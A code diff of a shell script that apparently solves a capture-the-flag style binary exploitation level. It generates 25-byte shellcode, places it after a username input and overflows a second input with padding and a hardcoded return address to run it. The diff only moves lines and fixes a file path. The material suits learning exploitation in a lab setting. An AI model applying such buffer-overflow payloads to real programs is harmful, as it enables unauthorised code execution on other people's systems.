@@ -54,16 +54,17 @@ main() {
 
     # Payload(s)
 
-    shellcode="$(generate_shellcode './data/shellcode.asm')";
-    shellcode_addr="\107\240\004\010"; # <=> a_user_login + sizeof("dat_wil").
-    user_input_1="$(printf '%s%b' 'dat_wil' "$shellcode")";
-    user_input_2="$(printf '%s%b' 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB' "$shellcode_addr")";
-
+    shellcode="$(generate_shellcode "$CURR_DIR_PATH/data/shellcode.asm")";
     shellcode_length="$(printf "%b" "$shellcode" | wc -c)";
+
     if [ "$shellcode_length" -ne "25" ]; then
         log "Error: The generated shellcode doesn't match the expected length. The related source file might have changed.";
         return 1;
     fi
+
+    shellcode_addr="\107\240\004\010"; # <=> a_user_login + sizeof("dat_wil").
+    user_input_1="$(printf '%s%b' 'dat_wil' "$shellcode")";
+    user_input_2="$(printf '%s%b' 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB' "$shellcode_addr")";
 
     # Resolution
 
